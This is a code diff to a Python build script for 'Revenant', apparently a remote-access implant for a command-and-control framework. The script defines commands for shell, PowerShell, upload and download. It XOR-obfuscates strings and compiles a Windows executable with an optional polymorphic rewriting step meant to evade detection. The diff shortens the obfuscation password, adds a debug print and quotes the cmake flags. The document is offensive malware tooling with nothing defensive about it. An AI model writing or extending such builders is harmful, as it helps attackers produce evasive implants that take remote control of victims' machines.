@@ -49,8 +49,8 @@ def generate_command_constants():
     return (COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_PWSH,COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT)
 
 
-GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=4))
-password_bytes = GENERATED_PASSWORD.encode('utf-8')
+GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=2))
+password_bytes = GENERATED_PASSWORD.encode('ascii')
 password_hex = ", ".join(f"0x{b:02x}" for b in password_bytes)
 
 seed_str: str = ''.join(random.choices(string.ascii_letters, k=8))
@@ -80,7 +80,7 @@ def xor_encode(s: str) -> str:
              (data[(i - byte_shift - 1) % len(data)] << (8 - bit_shift))) & 0xFF
             for i in range(len(data))
         )
-    password_bytes: bytes = GENERATED_PASSWORD.encode()
+    print(password_bytes)
     s_with_null_byte = s + "\x00"
     password_cycle: bytes = (password_bytes * (len(s_with_null_byte) // len(password_bytes) + 1))[:len(s_with_null_byte)]
     xor_bytes: bytes = bytes(b1 ^ b2 for b1, b2 in zip(s_with_null_byte.encode(), password_cycle))
@@ -372,7 +372,7 @@ class Revenant(AgentType):
             print("[*] Configuring String.h header...")
 
         if config['Options']['Arch'] == "64":
-            compile_command: str = "cmake -DARCH=x64 . && cmake --build . -j 1"
+            compile_command: str = "cmake -DARCH=\"x64\" . && cmake --build . -j 1"
             for attempt in range(10): # there's a likelihood that the polymorphic will break the code, retry 10 times
                 if config['Config']['Polymorphic']:
                     process_directory(directory_path, instructions_x64, eula, False)
@@ -404,7 +404,7 @@ class Revenant(AgentType):
             data = open("Agent/Bin/x64/Revenant.exe", "rb").read()
 
         elif config['Options']['Arch'] == "86":
-            compile_command: str = "cmake -DARCH=x86 . && cmake --build . -j 1"
+            compile_command: str = "cmake -DARCH=\"x86\" . && cmake --build . -j 1"
             for attempt in range(10): # there's a likelihood that the polymorphic will break the code, retry 10 times
                 if config['Config']['Polymorphic']:
                     process_directory(directory_path, instructions_x86, eula, False)
